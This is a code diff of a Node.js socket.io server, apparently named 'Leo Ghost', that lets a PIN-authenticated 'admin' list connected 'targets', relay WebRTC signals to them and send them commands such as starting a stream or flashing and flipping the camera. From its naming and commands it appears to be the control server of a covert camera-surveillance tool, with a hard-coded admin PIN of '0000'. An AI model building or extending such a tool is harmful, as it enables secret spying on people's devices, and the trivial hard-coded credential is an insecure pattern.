@@ -11,61 +11,43 @@ app.use(express.static('public'));
 let adminSocketId = null;
 
 io.on('connection', (socket) => {
-    console.log('User Connected:', socket.id);
+    console.log('User Joined:', socket.id);
 
-    // Jab Admin join kare (Pin check)
     socket.on('admin-join', (pin) => {
         if (pin === "0000") {
             adminSocketId = socket.id;
             socket.emit('admin-status', { success: true });
-            console.log("Admin Authorized:", socket.id);
-            
-            // Sabhi active targets ki list Admin ko bhejna
-            updateAdminTargetList();
+            updateTargetList();
         } else {
             socket.emit('admin-status', { success: false });
         }
     });
 
-    // Jab Target join kare
     socket.on('target-join', () => {
-        socket.join('targets');
-        console.log("Target Added to Pool:", socket.id);
-        updateAdminTargetList();
+        socket.join('targets_room');
+        updateTargetList();
     });
 
-    // Signaling: Admin se Target ya Target se Admin
     socket.on('signal', (data) => {
-        // data.to mein hum socket id bhejenge
-        io.to(data.to).emit('signal', {
-            from: socket.id,
-            signal: data.signal
-        });
+        io.to(data.to).emit('signal', { from: socket.id, signal: data.signal });
     });
-    // Commands: Flash, Flip, ya Start Stream
+
     socket.on('command', (data) => {
-        io.to(data.targetId).emit('command', {
-            cmd: data.cmd,
-            adminId: socket.id
-        });
+        io.to(data.targetId).emit('command', { cmd: data.cmd, adminId: socket.id });
     });
 
     socket.on('disconnect', () => {
-        if (socket.id === adminSocketId) {
-            adminSocketId = null;
-        }
-        updateAdminTargetList();
+        if (socket.id === adminSocketId) adminSocketId = null;
+        updateTargetList();
     });
 });
-
-function updateAdminTargetList() {
+function updateTargetList() {
     if (adminSocketId) {
-        // 'targets' room mein jitne bhi log hain unki list nikalo
-        const targetSockets = io.sockets.adapter.rooms.get('targets');
-        const list = targetSockets ? Array.from(targetSockets) : [];
+        const targets = io.sockets.adapter.rooms.get('targets_room');
+        const list = targets ? Array.from(targets) : [];
         io.to(adminSocketId).emit('update-targets', list);
     }
 }
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Leo-Ghost-V2 Server running on ${PORT}`));
+server.listen(PORT, () => console.log(`Leo Ghost Pro running on ${PORT}`));
